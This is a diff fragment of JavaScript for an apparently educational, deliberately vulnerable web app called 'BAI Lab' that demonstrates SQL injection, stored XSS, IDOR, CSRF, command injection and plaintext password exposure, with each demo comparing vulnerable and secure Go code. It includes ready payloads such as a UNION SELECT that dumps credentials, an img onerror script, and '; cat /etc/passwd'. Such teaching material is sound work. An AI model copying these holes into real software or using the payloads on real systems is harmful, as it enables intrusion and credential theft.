+          <a class="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full text-sm font-semibold bg-fuchsia-50 text-fuchsia-700 hover:bg-fuchsia-100 transition" href="#/posts/edit/${p.id}">✏️ Edit</a>
+          <button onclick="deletePost(${p.id})" class="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full text-sm font-semibold bg-rose-50 text-rose-700 hover:bg-rose-100 transition">🗑️ Delete</button>
+        </div>`:""}
+      </article>
+
+      <section class="rounded-2xl border border-fuchsia-100 bg-white/90 p-6 shadow-[0_12px_40px_rgba(236,72,153,0.08)] backdrop-blur">
+        <h2 class="text-xl font-bold text-slate-900 mb-4">💬 Comments <span class="text-sm font-medium text-slate-500">(${myComments.length})</span></h2>
+        <div class="space-y-3 mb-6">
+          ${myComments.length===0?`<p class="text-sm text-slate-500">No comments yet. Be the first.</p>`:
+            myComments.map(c=>`
+              <div class="rounded-xl border border-fuchsia-100 bg-fuchsia-50/40 p-3">
+                <p class="text-xs font-semibold text-fuchsia-700 mb-1">@${escapeHtml(c.author)}</p>
+                <div class="text-sm text-slate-700">${sec ? escapeHtml(c.body) : c.body}</div>
+              </div>`).join("")}
+        </div>
+        <form onsubmit="return submitComment(event, ${p.id})" class="space-y-3">
+          ${inputField({label:"Your comment",name:"body",rows:3,placeholder:sec?"HTML will be escaped — paste anything safely.":"⚠️ Vulnerable mode: HTML/JS will be rendered raw."})}
+          ${primaryBtn("✓ Post comment")}
+        </form>
+      </section>
+    </div>
+  `);
+}
+function submitComment(e, postId){
+  e.preventDefault();
+  const fd = new FormData(e.target);
+  const body = (fd.get("body")||"").toString();
+  if(!body.trim()){ setFlash("Comment body required.", true); render(); return false; }
+  const author = S.session ? S.session.username : "guest";
+  S.comments.push({id:S.nextCommentId++, post_id:postId, author, body});
+  save(); render(); return false;
+}
+
+/* ---------------- Edit ---------------- */
+function pagePostEdit({params}){
+  const p = S.posts.find(x=>x.id===params.id);
+  if(!p) return pageWrap(panel(`<p class="text-slate-700">Post not found.</p>`));
+  const sec = S.securityEnabled;
+  if(sec && (!S.session || (S.session.role!=="admin" && S.session.id!==p.author_id))){
+    return pageWrap(panel(`
+      <h1 class="text-2xl font-bold mb-2">🚫 Forbidden</h1>
+      <p class="text-slate-600">You can only edit your own posts in Secure mode.</p>
+      <div class="mt-4">${ghostBtn("← Back","#/posts")}</div>`));
+  }
+  return pageWrap(`
+    <div class="max-w-2xl mx-auto">
+      <div class="mb-6"><a href="#/posts" class="text-sm font-semibold text-fuchsia-600 hover:text-fuchsia-700 transition">← Back to Posts</a></div>
+      <div class="rounded-2xl border border-fuchsia-100 bg-white/90 p-8 shadow-[0_12px_40px_rgba(236,72,153,0.12)] backdrop-blur">
+        <h1 class="text-3xl font-bold text-slate-900 mb-2">✏️ Edit Post</h1>
+        <p class="text-slate-600 mb-6">Update your post content</p>
+        ${flashHTML()}
+        <form onsubmit="return submitEditPost(event, ${p.id})" class="mt-6 space-y-4">
+          ${inputField({label:"Title",name:"title",value:p.title,required:true,min:1,max:200})}
+          <div>
+            <label class="block text-sm font-semibold text-slate-700 mb-2" for="post_content">Content</label>
+            <textarea class="w-full rounded-xl border border-fuchsia-200 bg-white px-3 py-2 text-slate-900 outline-none ring-2 ring-transparent focus:border-pink-400 focus:ring-pink-100 transition font-mono text-sm" id="post_content" name="post_content" rows="10">${escapeHtml(p.post_content)}</textarea>
+          </div>
+          <label class="flex items-center gap-2 cursor-pointer">
+            <input class="w-4 h-4 rounded border-fuchsia-300 text-fuchsia-600 focus:ring-2 focus:ring-fuchsia-500" type="checkbox" name="published" value="1" ${p.published===1?"checked":""}>
+            <span class="text-sm font-medium text-slate-700">Publish this post</span>
+          </label>
+          <div class="flex items-center gap-3 pt-4 border-t border-fuchsia-100">
+            ${primaryBtn("💾 Save Changes")}
+            ${ghostBtn("Cancel","#/posts")}
+          </div>
+        </form>
+      </div>
+    </div>`);
+}
+function submitEditPost(e, id){
+  e.preventDefault();
+  const p = S.posts.find(x=>x.id===id); if(!p){ setFlash("Not found",true); render(); return false; }
+  const fd = new FormData(e.target);
+  p.title = (fd.get("title")||"").toString();
+  p.post_content = (fd.get("post_content")||"").toString();
+  p.published = fd.get("published") ? 1 : 0;
+  setFlash("Post updated.", false);
+  save(); location.hash = "#/posts"; return false;
+}
+
+/* ---------------- Login ---------------- */
+function pageLogin(){
+  return pageWrap(`
+    <div class="max-w-md mx-auto">
+      <div class="rounded-2xl border border-fuchsia-100 bg-white/90 p-8 shadow-[0_12px_40px_rgba(236,72,153,0.12)] backdrop-blur">
+        <h1 class="text-3xl font-bold text-slate-900 mb-2">🔑 Login</h1>
+        <p class="text-slate-600 mb-6">Access your account to manage posts</p>
+        ${flashHTML()}
+        <form onsubmit="return submitLogin(event)" class="mt-6 space-y-4">
+          ${inputField({label:"Username",name:"username",placeholder:"your username",required:true,extra:'autocomplete="username"'})}
+          ${inputField({label:"Password",name:"password",type:"password",placeholder:"••••••••",required:true,extra:'autocomplete="current-password"'})}
+          ${primaryBtn("✓ Login")}
+        </form>
+        <p class="text-center text-sm text-slate-600 mt-6">Don't have an account? <a href="#/register" class="font-semibold text-fuchsia-600 hover:text-fuchsia-700 transition">Register here</a></p>
+        <details class="mt-6 rounded-xl border border-fuchsia-100 bg-fuchsia-50/60 p-3">
+          <summary class="text-xs font-semibold text-fuchsia-800">🧪 Demo credentials</summary>
+          <ul class="mt-2 text-xs font-mono text-slate-700 space-y-1">
+            <li>admin / admin <span class="text-fuchsia-600">(role: admin)</span></li>
+            <li>alice / hunter2</li>
+            <li>bob / qwerty</li>
+          </ul>
+        </details>
+      </div>
+    </div>`);
+}
+function submitLogin(e){
+  e.preventDefault();
+  const fd = new FormData(e.target);
+  const u = (fd.get("username")||"").toString();
+  const p = (fd.get("password")||"").toString();
+  // Vulnerable mode simulates SQLi-style auth bypass: ' OR '1'='1
+  if(!S.securityEnabled){
+    if(/'\s*OR\s*'1'\s*=\s*'1/i.test(u) || /'\s*OR\s*'1'\s*=\s*'1/i.test(p)){
+      const admin = S.users.find(x=>x.role==="admin");
+      S.session = {username:admin.username, role:admin.role, id:admin.id};
+      setFlash("⚠️ SQLi bypass succeeded! Logged in as admin (vulnerable mode).", false);
+      save(); location.hash="#/posts"; return false;
+    }
+  }
+  const user = S.users.find(x => x.username===u && x.password===p);
+  if(!user){ setFlash("Invalid username or password.", true); render(); return false; }
+  S.session = {username:user.username, role:user.role, id:user.id};
+  setFlash(`Welcome back, ${user.username}!`, false);
+  save(); location.hash="#/posts"; return false;
+}
+function logout(){ S.session=null; setFlash("Logged out.", false); save(); location.hash="#/posts"; render(); }
+
+/* ---------------- Register ---------------- */
+function pageRegister(){
+  return pageWrap(`
+    <div class="max-w-md mx-auto">
+      <div class="rounded-2xl border border-fuchsia-100 bg-white/90 p-8 shadow-[0_12px_40px_rgba(236,72,153,0.12)] backdrop-blur">
+        <h1 class="text-3xl font-bold text-slate-900 mb-2">✍️ Create Account</h1>
+        <p class="text-slate-600 mb-6">Join BAI Lab to manage posts</p>
+        ${flashHTML()}
+        <form onsubmit="return submitRegister(event)" class="mt-6 space-y-4">
+          ${inputField({label:"Username",name:"username",placeholder:"Choose a username",required:true,min:3,max:50})}
+          ${inputField({label:"Email",name:"email",type:"email",placeholder:"your@email.com",required:true})}
+          ${inputField({label:"Password",name:"password",type:"password",placeholder:"••••••••",required:true,min:6})}
+          ${primaryBtn("✓ Create Account")}
+        </form>
+        <p class="text-center text-sm text-slate-600 mt-6">Already have an account? <a href="#/login" class="font-semibold text-fuchsia-600 hover:text-fuchsia-700 transition">Login here</a></p>
+      </div>
+    </div>`);
+}
+function submitRegister(e){
+  e.preventDefault();
+  const fd = new FormData(e.target);
+  const username = (fd.get("username")||"").toString().trim();
+  const email = (fd.get("email")||"").toString().trim();
+  const password = (fd.get("password")||"").toString();
+  if(S.users.some(u=>u.username===username)){ setFlash("Username already taken.", true); render(); return false; }
+  S.users.push({id:S.nextUserId++, username, email, password, role:"user", passwordHash:"$2a$10$..."+username});
+  setFlash("Account created! You can log in now.", false);
+  save(); location.hash="#/login"; return false;
+}
+
+/* ---------------- Admin Panel (new) ---------------- */
+function pageAdmin(){
+  if(!S.session || S.session.role!=="admin"){
+    return pageWrap(panel(`
+      <h1 class="text-2xl font-bold mb-2">🚫 Admin only</h1>
+      <p class="text-slate-600">${S.securityEnabled?"You must log in as an administrator.":"⚠️ In Vulnerable mode, this page is reachable without auth — but here you're not logged in. Try /login."}</p>
+      <div class="mt-4">${ghostBtn("← Posts","#/posts")}</div>`));
+  }
+  const totalPosts = S.posts.length;
+  const drafts = S.posts.filter(p=>p.published===0).length;
+  const usersHtml = S.users.map(u=>`
+    <tr class="border-b border-fuchsia-100/50">
+      <td class="px-3 py-2 font-mono text-xs">${u.id}</td>
+      <td class="px-3 py-2 font-semibold">@${escapeHtml(u.username)}</td>
+      <td class="px-3 py-2 text-slate-600">${escapeHtml(u.email)}</td>
+      <td class="px-3 py-2">${u.role==="admin"?'<span class="inline-flex items-center px-2 py-0.5 rounded-full text-xs font-bold bg-gradient-to-r from-fuchsia-500 to-pink-500 text-white">ADMIN</span>':'<span class="text-xs text-slate-500">user</span>'}</td>
+      <td class="px-3 py-2 font-mono text-xs ${S.securityEnabled?'text-slate-400':'text-rose-600'}">${S.securityEnabled?"●●●●●●●●":escapeHtml(u.password)}</td>
+      <td class="px-3 py-2 text-right">
+        ${u.username!=="admin"?`<button onclick="deleteUser(${u.id})" class="text-xs font-semibold text-rose-600 hover:text-rose-800">Delete</button>`:`<span class="text-xs text-slate-400">protected</span>`}
+      </td>
+    </tr>`).join("");
+
+  return pageWrap(`
+    <div class="space-y-8">
+      ${pageHeader("Admin","System overview & user management","🛠️")}
+      ${flashHTML()}
+      <div class="grid sm:grid-cols-3 gap-4">
+        ${statCard("Total posts", totalPosts, "📝", "from-fuchsia-500 to-pink-500")}
+        ${statCard("Drafts", drafts, "⊙", "from-amber-400 to-rose-400")}
+        ${statCard("Users", S.users.length, "👥", "from-cyan-400 to-sky-500")}
+      </div>
+      ${panel(`
+        <div class="flex items-center justify-between mb-4">
+          <h2 class="text-lg font-bold">Users</h2>
+          <button onclick="resetState()" class="text-xs font-semibold text-rose-600 hover:text-rose-800">Reset demo data</button>
+        </div>
+        <div class="overflow-x-auto">
+          <table class="w-full text-sm">
+            <thead class="text-left text-xs text-slate-500 uppercase tracking-wide">
+              <tr><th class="px-3 py-2">ID</th><th class="px-3 py-2">Username</th><th class="px-3 py-2">Email</th><th class="px-3 py-2">Role</th><th class="px-3 py-2">Password</th><th></th></tr>
+            </thead>
+            <tbody>${usersHtml}</tbody>
+          </table>
+        </div>
+        ${!S.securityEnabled?`<p class="mt-3 text-xs text-rose-600">⚠️ Sensitive Data Exposure — passwords visible in plaintext. Switch to Secure mode to mask.</p>`:`<p class="mt-3 text-xs text-emerald-600">✓ Passwords masked. (In production, only hashes are stored — bcrypt.)</p>`}
+      `)}
+    </div>
+  `);
+}
+function statCard(label,value,icon,grad){
+  return `<div class="rounded-2xl border border-fuchsia-100 bg-white/90 p-5 shadow-[0_12px_40px_rgba(236,72,153,0.08)] backdrop-blur">
+    <div class="flex items-center gap-3">
+      <div class="h-12 w-12 rounded-2xl bg-gradient-to-br ${grad} flex items-center justify-center text-white text-xl shadow-md">${icon}</div>
+      <div>
+        <p class="text-xs text-slate-500 uppercase tracking-wide font-semibold">${label}</p>
+        <p class="text-2xl font-bold text-slate-900 leading-tight">${value}</p>
+      </div>
+    </div>
+  </div>`;
+}
+function deleteUser(id){
+  if(!confirm("Delete user?")) return;
+  S.users = S.users.filter(u=>u.id!==id);
+  save(); render();
+}
+
+/* ============================================================
+   VULNERABILITY DEMOS
+============================================================ */
+function pageVulnIndex(){
+  const items = [
+    ["sqli","SQL Injection","Search posts by title — user input concatenated into SQL.","💉","from-rose-500 to-orange-500"],
+    ["xss","Cross-Site Scripting","Stored XSS via comments rendered without escaping.","🪤","from-fuchsia-500 to-pink-500"],
+    ["idor","Broken Access Control / IDOR","Edit someone else's post by changing the ID in the URL.","🔓","from-amber-500 to-rose-500"],
+    ["csrf","CSRF","Force a logged-in user to change password via forged request.","🛂","from-violet-500 to-fuchsia-500"],
+    ["cmd","Command Injection","Ping form runs a shell command without sanitization.","💻","from-sky-500 to-cyan-500"],
+    ["exposure","Sensitive Data Exposure","Endpoint returns raw user records, including plaintext passwords.","🗝️","from-emerald-500 to-cyan-500"],
+  ];
+  return pageWrap(`
+    <div class="space-y-6">
+      ${pageHeader("Vulnerability Catalog", S.securityEnabled?"You're in Secure mode — exploits will be blocked. Toggle to Vulnerable to see them work.":"You're in Vulnerable mode — every demo below works. Open Tweaks (right) to switch to Secure.","🧪")}
+      ${flashHTML()}
+      <div class="grid sm:grid-cols-2 gap-4">
+        ${items.map(([slug,title,desc,icon,grad])=>`
+          <a href="#/vuln/${slug}" class="group rounded-2xl border border-fuchsia-100 bg-white/90 p-5 shadow-[0_12px_40px_rgba(236,72,153,0.08)] backdrop-blur transition hover:-translate-y-0.5 hover:shadow-[0_16px_50px_rgba(236,72,153,0.16)]">
+            <div class="flex items-start gap-4">
+              <div class="h-12 w-12 rounded-2xl bg-gradient-to-br ${grad} flex items-center justify-center text-white text-xl shadow-md shrink-0">${icon}</div>
+              <div class="flex-1">
+                <h3 class="text-lg font-bold text-slate-900 group-hover:text-fuchsia-700 transition">${title}</h3>
+                <p class="text-sm text-slate-600 mt-1">${escapeHtml(desc)}</p>
+                <p class="text-xs font-semibold text-fuchsia-600 mt-3">Open demo →</p>
+              </div>
+            </div>
+          </a>`).join("")}
+      </div>
+    </div>
+  `);
+}
+
+function vulnHeader(title, subtitle, icon){
+  const tag = S.securityEnabled
+    ? `<span class="inline-flex items-center gap-1 rounded-full bg-emerald-100 text-emerald-800 px-3 py-1 text-xs font-bold">🛡️ Secure mode — exploit BLOCKED</span>`
+    : `<span class="inline-flex items-center gap-1 rounded-full bg-rose-100 text-rose-800 px-3 py-1 text-xs font-bold">⚠️ Vulnerable mode — exploit WORKS</span>`;
+  return `
+    <div class="flex items-start justify-between gap-4 mb-2">
+      <div>
+        <a href="#/vuln" class="text-sm font-semibold text-fuchsia-600 hover:text-fuchsia-700 transition">← Back to catalog</a>
+        <h1 class="text-3xl font-bold text-slate-900 mt-2">${icon} ${escapeHtml(title)}</h1>
+        <p class="text-slate-600 mt-1">${escapeHtml(subtitle)}</p>
+      </div>
+      ${tag}
+    </div>`;
+}
+
+function codeCompare({title,bad,good,badLang="go",goodLang="go"}){
+  return panel(`
+    <h3 class="text-base font-bold text-slate-900 mb-3">${escapeHtml(title)}</h3>
+    <div class="grid md:grid-cols-2 gap-3">
+      <div class="rounded-xl overflow-hidden border border-rose-200">
+        <div class="bg-rose-50 px-3 py-1.5 text-xs font-bold text-rose-700">⚠️ Vulnerable</div>
+        <pre class="terminal" style="border-radius:0;background:#1a0d10"><code class="err">${escapeHtml(bad)}</code></pre>
+      </div>
+      <div class="rounded-xl overflow-hidden border border-emerald-200">
+        <div class="bg-emerald-50 px-3 py-1.5 text-xs font-bold text-emerald-700">🛡️ Secure</div>
+        <pre class="terminal" style="border-radius:0;background:#0a1410"><code class="ok">${escapeHtml(good)}</code></pre>
+      </div>
+    </div>
+  `);
+}
+
+/* ----- 1. SQL Injection ----- */
+function pageVulnSqli(){
+  return pageWrap(`
+    <div class="space-y-6">
+      ${vulnHeader("SQL Injection","Search posts by title — vulnerable mode concatenates user input into SQL.","💉")}
+      ${panel(`
+        <h3 class="text-base font-bold mb-2">Try a payload</h3>
+        <p class="text-sm text-slate-600 mb-4">Suggested payloads: <code class="bg-fuchsia-50 px-2 py-0.5 rounded text-fuchsia-700">' OR 1=1 --</code> &nbsp; <code class="bg-fuchsia-50 px-2 py-0.5 rounded text-fuchsia-700">' UNION SELECT 1,username,password,1,1 FROM users --</code></p>
+        <form onsubmit="return runSqli(event)" class="flex gap-2">
+          <input id="sqli-input" name="q" class="flex-1 rounded-xl border border-fuchsia-200 bg-white px-3 py-2 outline-none focus:border-pink-400 focus:ring-2 focus:ring-pink-100 font-mono text-sm" placeholder="Search post title..." value="' OR 1=1 --">
+          ${primaryBtn("🔎 Search","submit")}
+        </form>
+        <div id="sqli-out" class="mt-4"></div>
+      `)}
+      ${codeCompare({
+        title:"Code review",
+        bad:`q := c.Query("q")
+sql := "SELECT id,title FROM posts WHERE title LIKE '%" + q + "%'"
+rows, _ := db.Query(sql) // ⚠️ string concat`,
+        good:`q := c.Query("q")
+rows, err := db.Query(
+  "SELECT id, title FROM posts WHERE title LIKE ?",
+  "%"+q+"%", // ✓ parameterized
+)`
+      })}
+    </div>
+  `);
+}
+function runSqli(e){
+  e.preventDefault();
+  const q = document.getElementById("sqli-input").value;
+  const out = document.getElementById("sqli-out");
+  if(S.securityEnabled){
+    const matches = S.posts.filter(p => p.title.toLowerCase().includes(q.toLowerCase()));
+    out.innerHTML = `
+      <div class="rounded-xl border border-emerald-200 bg-emerald-50 px-4 py-3 text-sm text-emerald-800 mb-3">🛡️ Secure: query parameterized. Returned only literal title matches.</div>
+      ${matches.length===0?`<p class="text-sm text-slate-500">No results.</p>`:`<ul class="space-y-1 text-sm">${matches.map(p=>`<li class="font-mono">#${p.id} — ${escapeHtml(p.title)}</li>`).join("")}</ul>`}`;
+    return false;
+  }
+  // Vulnerable: ' OR 1=1 -- returns ALL posts; UNION SELECT leaks users
+  let injected = false;
+  let unionLeak = false;
+  if(/'\s*OR\s*1\s*=\s*1/i.test(q)) injected = true;
+  if(/UNION\s+SELECT/i.test(q) && /users/i.test(q)) unionLeak = true;
+
+  let html = `<div class="terminal mb-3"><span class="dim">$ sqlite&gt; </span><span class="warn">SELECT id,title FROM posts WHERE title LIKE '%${escapeHtml(q)}%'</span>\n`;
+  let rows = S.posts.filter(p => p.title.toLowerCase().includes(q.toLowerCase()));
+  if(injected) rows = S.posts.slice();
+  rows.forEach(p => html += `<span class="ok">${String(p.id).padStart(2)}</span>  ${escapeHtml(p.title)}\n`);
+  if(unionLeak){
+    html += `<span class="err">-- UNION leaked rows from users --</span>\n`;
+    S.users.forEach(u => html += `<span class="err">${u.id}  ${u.username}  ${u.password}</span>\n`);
+  }
+  html += `</div>`;
+  if(injected || unionLeak) html = `<div class="rounded-xl border border-rose-200 bg-rose-50 px-4 py-3 text-sm text-rose-800 mb-3">⚠️ SQL Injection succeeded. ${unionLeak?"User credentials leaked via UNION.":"Filter bypassed — full table returned."}</div>` + html;
+  out.innerHTML = html;
+  return false;
+}
+
+/* ----- 2. XSS ----- */
+function pageVulnXss(){
+  const post3 = S.posts.find(p=>p.id===3) || S.posts[0];
+  return pageWrap(`
+    <div class="space-y-6">
+      ${vulnHeader("Stored XSS","Comments are rendered without escaping in vulnerable mode.","🪤")}
+      ${panel(`
+        <h3 class="text-base font-bold mb-2">Walk-through</h3>
+        <ol class="list-decimal list-inside text-sm text-slate-700 space-y-1">
+          <li>Open the post <a class="font-semibold text-fuchsia-700 hover:underline" href="#/posts/view/${post3.id}">"${escapeHtml(post3.title)}"</a>.</li>
+          <li>Submit a comment with payload <code class="bg-fuchsia-50 px-2 py-0.5 rounded text-fuchsia-700">&lt;img src=x onerror=alert('XSS')&gt;</code>.</li>
+          <li>In <strong>Vulnerable</strong> mode the script runs every time anyone views the post.</li>
+          <li>Switch to <strong>Secure</strong> mode — the same payload is escaped and rendered as text.</li>
+        </ol>
+      `)}
+      ${codeCompare({
+        title:"Code review",
+        badLang:"templ", goodLang:"templ",
+        bad:`@templ
+{!comment.Body!} // ⚠️ unescaped raw HTML`,
+        good:`@templ
+{ comment.Body }   // ✓ auto-escaped
+// + Content-Security-Policy: script-src 'self'`
+      })}
+    </div>
+  `);
+}
+
+/* ----- 3. IDOR ----- */
+function pageVulnIdor(){
+  const my = S.session ? S.session : {username:"alice", id:2};
+  const someoneElse = S.posts.find(p => p.author_id !== my.id) || S.posts[0];
+  return pageWrap(`
+    <div class="space-y-6">
+      ${vulnHeader("Broken Access Control (IDOR)","Edit/delete URLs reveal IDs — try changing them.","🔓")}
+      ${panel(`
+        <h3 class="text-base font-bold mb-2">Walk-through</h3>
+        <p class="text-sm text-slate-700 mb-3">${S.session?`You're logged in as <strong>@${escapeHtml(S.session.username)}</strong>.`:`Log in as <code class="bg-fuchsia-50 px-2 py-0.5 rounded text-fuchsia-700">alice / hunter2</code> first.`}</p>
+        <ol class="list-decimal list-inside text-sm text-slate-700 space-y-1">
+          <li>Open your own post and notice the URL ends in <code class="bg-fuchsia-50 px-1 rounded">/posts/edit/&lt;id&gt;</code>.</li>
+          <li>Change the ID to one belonging to another user — e.g. <a href="#/posts/edit/${someoneElse.id}" class="font-semibold text-fuchsia-700 hover:underline">/posts/edit/${someoneElse.id}</a> (post by author #${someoneElse.author_id}).</li>
+          <li>In <strong>Vulnerable</strong> mode the edit form opens. In <strong>Secure</strong> mode the server compares <code>session.user_id</code> to <code>post.author_id</code> and returns 403.</li>
+        </ol>
+      `)}
+      ${codeCompare({
+        title:"Code review",
+        bad:`func (h *Handlers) PagePostEditSubmit(c *gin.Context) {
+  id := atoi(c.Param("id"))
+  // ⚠️ no ownership check
+  h.svc.UpdatePost(id, title, body)
+}`,
+        good:`func (h *Handlers) PagePostEditSubmit(c *gin.Context) {
+  id := atoi(c.Param("id"))
+  uid := session.UserID(c)
+  post, _ := h.svc.GetPost(id)
+  if post.AuthorID != uid && !session.IsAdmin(c) {
+      c.AbortWithStatus(http.StatusForbidden); return
+  }
+  h.svc.UpdatePost(id, title, body)
+}`
+      })}
+    </div>
+  `);
+}
+
+/* ----- 4. CSRF ----- */
+function pageVulnCsrf(){
+  return pageWrap(`
+    <div class="space-y-6">
+      ${vulnHeader("Cross-Site Request Forgery","An evil 3rd-party page changes a logged-in user's password.","🛂")}
+      ${panel(`
+        <h3 class="text-base font-bold mb-2">Simulated attacker page</h3>
+        <p class="text-sm text-slate-700 mb-3">Imagine the user (currently <strong>@${escapeHtml(S.session?S.session.username:"not logged in")}</strong>) visits this innocuous-looking page on <code class="bg-fuchsia-50 px-1 rounded">evil.example.com</code>. Click the button to fire the request.</p>
+        <div class="rounded-xl border border-slate-300 bg-white p-4">
+          <div class="text-xs text-slate-500 mb-1">🌐 evil.example.com — "Free Cat Pics"</div>
+          <p class="text-sm text-slate-700 mb-3">Click the button to enter the giveaway! 🐱</p>
+          <form onsubmit="return runCsrf(event)">
+            <input type="hidden" name="new_password" value="pwn3d-by-evil">
+            <button class="px-4 py-2 rounded-lg bg-amber-500 text-white font-bold shadow hover:bg-amber-600">🎁 Claim free cat pics!</button>
+          </form>
+        </div>
+        <div id="csrf-out" class="mt-4"></div>
+      `)}
+      ${codeCompare({
+        title:"Code review",
+        bad:`router.POST("/users/me/password", h.ChangePassword)
+// ⚠️ no CSRF token, no SameSite cookie`,
+        good:`router.POST("/users/me/password",
+  csrf.Middleware(),     // ✓ token check
+  h.ChangePassword,
+)
+// + cookie: SameSite=Lax; Secure; HttpOnly`
+      })}
+    </div>
+  `);
+}
+function runCsrf(e){
+  e.preventDefault();
+  const out = document.getElementById("csrf-out");
+  if(!S.session){
+    out.innerHTML = resultMessage("Nothing happens — user is not logged in to BAI Lab.", false);
+    return false;
+  }
+  if(S.securityEnabled){
+    out.innerHTML = `<div class="rounded-xl border border-emerald-200 bg-emerald-50 px-4 py-3 text-sm text-emerald-800">🛡️ Secure: request rejected — missing CSRF token + SameSite cookie blocks the cross-origin POST.</div>`;
+    return false;
+  }
+  const u = S.users.find(x => x.id === S.session.id);
+  if(u){ u.password = "pwn3d-by-evil"; save(); }
+  out.innerHTML = `<div class="rounded-xl border border-rose-200 bg-rose-50 px-4 py-3 text-sm text-rose-800">⚠️ Password for <strong>@${escapeHtml(u.username)}</strong> silently changed to <code class="font-mono bg-white px-1 rounded">pwn3d-by-evil</code>. Try logging in again — original password no longer works.</div>`;
+  return false;
+}
+
+/* ----- 5. Command Injection ----- */
+function pageVulnCmd(){
+  return pageWrap(`
+    <div class="space-y-6">
+      ${vulnHeader("Command Injection","A 'ping host' admin tool runs sh -c with user input.","💻")}
+      ${panel(`
+        <h3 class="text-base font-bold mb-2">Try it</h3>
+        <p class="text-sm text-slate-600 mb-3">Suggested payload: <code class="bg-fuchsia-50 px-2 py-0.5 rounded text-fuchsia-700">8.8.8.8 ; cat /etc/passwd</code></p>
+        <form onsubmit="return runCmd(event)" class="flex gap-2">
+          <input id="cmd-input" class="flex-1 rounded-xl border border-fuchsia-200 bg-white px-3 py-2 outline-none focus:border-pink-400 focus:ring-2 focus:ring-pink-100 font-mono text-sm" value="8.8.8.8 ; cat /etc/passwd">
+          ${primaryBtn("📡 Ping","submit")}
+        </form>
+        <div id="cmd-out" class="mt-4"></div>
+      `)}
+      ${codeCompare({
+        title:"Code review",
+        bad:`host := c.Query("host")
+out, _ := exec.Command("sh","-c","ping -c1 "+host).Output()
+// ⚠️ shell metacharacters not escaped`,
+        good:`host := c.Query("host")
+if !validHostRegex.MatchString(host) {
+    c.AbortWithStatus(400); return
+}
+out, _ := exec.Command("ping", "-c1", host).Output()
+// ✓ no shell, strict input validation`
+      })}
+    </div>`);
+}
+function runCmd(e){
+  e.preventDefault();
+  const v = document.getElementById("cmd-input").value;
+  const out = document.getElementById("cmd-out");
+  if(S.securityEnabled){
+    if(!/^[a-zA-Z0-9.\-]+$/.test(v.trim())){
+      out.innerHTML = `<div class="rounded-xl border border-emerald-200 bg-emerald-50 px-4 py-3 text-sm text-emerald-800">🛡️ Secure: rejected — host contains invalid characters.</div>`;
+      return false;
+    }
+    out.innerHTML = `<div class="terminal"><span class="dim">$ </span><span class="info">ping -c1 ${escapeHtml(v)}</span>\n<span class="ok">PING ${escapeHtml(v)}: 56 data bytes\n64 bytes from ${escapeHtml(v)}: icmp_seq=0 ttl=58 time=12.4 ms</span></div>`;
+    return false;
+  }
+  // Vulnerable: simulate ; cat /etc/passwd
+  let html = `<div class="terminal"><span class="dim">$ </span><span class="warn">sh -c "ping -c1 ${escapeHtml(v)}"</span>\n`;
+  html += `<span class="ok">PING ${escapeHtml(v.split(";")[0].trim())}: 56 data bytes\n64 bytes from ...: icmp_seq=0 ttl=58 time=12.4 ms</span>\n`;
+  if(/;\s*cat\s+\/etc\/passwd/.test(v)){
+    html += `<span class="err">root:x:0:0:root:/root:/bin/bash\nbai:x:1000:1000:BAI Lab,,,:/home/bai:/bin/bash\nsqlite:x:1001:1001::/home/sqlite:/usr/sbin/nologin</span>\n`;
+  } else if(/;\s*whoami/.test(v)){
+    html += `<span class="err">www-data</span>\n`;
+  } else if(/;/.test(v)){
+    html += `<span class="warn">[command after ; would also run on a real shell]</span>\n`;
+  }
+  html += `</div>`;
+  out.innerHTML = `<div class="rounded-xl border border-rose-200 bg-rose-50 px-4 py-3 text-sm text-rose-800 mb-3">⚠️ Command Injection: shell metacharacters (<code>;</code>) split the command — second command runs with the server's privileges.</div>`+html;
+  return false;
+}
+
+/* ----- 6. Sensitive Data Exposure ----- */
+function pageVulnExposure(){
+  return pageWrap(`
+    <div class="space-y-6">
+      ${vulnHeader("Sensitive Data Exposure","An /api/users endpoint returns full user records, including plaintext passwords.","🗝️")}
+      ${panel(`
+        <div class="flex items-center justify-between mb-3">
+          <h3 class="text-base font-bold">GET /api/users</h3>
+          <button onclick="document.getElementById('exp-out').innerHTML = renderExposure()" class="text-xs font-semibold text-fuchsia-700 hover:text-fuchsia-900">↻ Re-fetch</button>
+        </div>
+        <div id="exp-out">${renderExposure()}</div>
+      `)}
+      ${codeCompare({
+        title:"Code review",
+        bad:`func (s *Service) AllUsers() ([]User, error) {
+  return s.db.Query("SELECT id,username,email,password,role FROM users")
+  // ⚠️ exposes plaintext password column
+}`,
+        good:`type PublicUser struct{ ID int; Username, Email, Role string }
+// store bcrypt hash, never plaintext
+return s.db.Query("SELECT id,username,email,role FROM users") // ✓ no password column`
+      })}
+    </div>`);
+}
+function renderExposure(){
+  if(S.securityEnabled){
+    const safe = S.users.map(u=>({id:u.id,username:u.username,email:u.email,role:u.role}));
+    return `<div class="rounded-xl border border-emerald-200 bg-emerald-50 px-4 py-3 text-sm text-emerald-800 mb-3">🛡️ Secure: password column omitted, only public fields returned.</div>
+      <pre class="terminal"><span class="ok">${escapeHtml(JSON.stringify(safe,null,2))}</span></pre>`;
+  }
+  return `<div class="rounded-xl border border-rose-200 bg-rose-50 px-4 py-3 text-sm text-rose-800 mb-3">⚠️ Vulnerable: full row returned, including plaintext passwords.</div>
+    <pre class="terminal"><span class="err">${escapeHtml(JSON.stringify(S.users.map(u=>({id:u.id,username:u.username,email:u.email,password:u.password,role:u.role})),null,2))}</span></pre>`;
+}
+
+/* ---------------- About ---------------- */
+function pageAbout(){
+  return pageWrap(panel(`
+    <h1 class="text-3xl font-bold mb-2">About BAI Lab</h1>
+    <p class="text-slate-700 mb-4">University project for "Network Infrastructure Security". Demonstrates the contrast between a vulnerable Go web app and its secured counterpart.</p>
+    <h3 class="text-lg font-bold mt-4 mb-2">Tech</h3>
+    <ul class="text-sm text-slate-700 list-disc list-inside">
+      <li>Go + Gin + SQLite</li><li>Templ server-side templates</li><li>HTMX partials</li><li>Tailwind CSS pipeline</li>
+    </ul>
+  `));
+}
+
+function pagePostNew(){ location.hash = "#/posts"; return ""; }
+
+/* ============================================================
+   TWEAKS PANEL
+============================================================ */
+let tweaksOpen = false;
+function buildTweaks(){
+  const sec = S.securityEnabled;
+  const wrap = document.createElement("div");
+  wrap.id = "tweaks-panel";
